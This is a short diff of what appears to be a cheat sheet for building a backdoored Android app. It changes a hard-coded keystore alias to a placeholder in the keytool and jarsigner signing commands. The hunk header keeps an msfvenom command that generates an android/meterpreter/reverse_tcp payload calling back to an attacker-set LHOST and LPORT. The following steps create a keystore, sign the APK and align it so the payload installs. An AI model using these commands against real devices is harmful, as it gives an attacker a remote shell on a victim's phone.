@@ -40,13 +40,13 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<port> M> <locat
 
 # Creating a keystore file
 
-keytool -genkey -V -keystore <path for keystore> -alias yash -keyalg RSA -keysize 2048 -validity 1000
+keytool -genkey -V -keystore <path for keystore> -alias <alias_name> -keyalg RSA -keysize 2048 -validity 1000
 
 
 
 # Signing an apk
 
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <keystore location> <apk location> yash
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <keystore location> <apk location> <alias_name>
 
 
 # Aligning an apk
